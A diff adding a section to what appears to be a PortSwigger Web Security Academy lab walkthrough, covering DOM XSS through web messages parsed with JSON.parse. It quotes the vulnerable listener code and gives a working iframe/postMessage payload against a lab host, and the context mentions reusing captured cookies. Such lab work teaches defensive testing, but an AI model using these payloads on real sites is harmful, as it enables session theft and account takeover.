@@ -2081,3 +2081,50 @@ For normal request I just refreshed the site for a given blog post (for testing 
 With captured cookies, we can access `/my-account` endpoint:
 
 <img width="1374" height="691" alt="image" src="https://github.com/user-attachments/assets/e6fd0dd5-d04c-42c9-8c62-714d00bfd1b0" />
+
+## DOM-based issues
+
+### Lab: DOM XSS using web messages and JSON.parse
+
+    https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse
+
+Notice event listener (`addEventListener`) handling code in HTML source code:
+
+```
+                   <script>
+                        window.addEventListener('message', function(e) {
+                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+                            document.body.appendChild(iframe);
+                            try {
+                                d = JSON.parse(e.data);
+                            } catch(e) {
+                                return;
+                            }
+                            switch(d.type) {
+                                case "page-load":
+                                    ACMEplayer.element.scrollIntoView();
+                                    break;
+                                case "load-channel":
+                                    ACMEplayer.element.src = d.url;
+                                    break;
+                                case "player-height-changed":
+                                    ACMEplayer.element.style.width = d.width + "px";
+                                    ACMEplayer.element.style.height = d.height + "px";
+                                    break;
+                            }
+                        }, false);
+                    </script>
+```
+
+Message is parsed as JSON object (`d = JSON.parse(e.data);`) and then type property is checked `switch(d.type) {` and if it's equal to `load-channel` then url propery is assigned to `iframe` element `src`: `ACMEplayer.element.src = d.url;`. So to trigger this vulnerability (lack of verifying the `Origin` of incoming message) we should construct following JSON object:
+
+```
+{
+ "type":"load-channel",
+ "url": "javascript:print()"
+}
+```
+
+Final payload that should be served from attacker controlled server will look like this:
+
+    <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
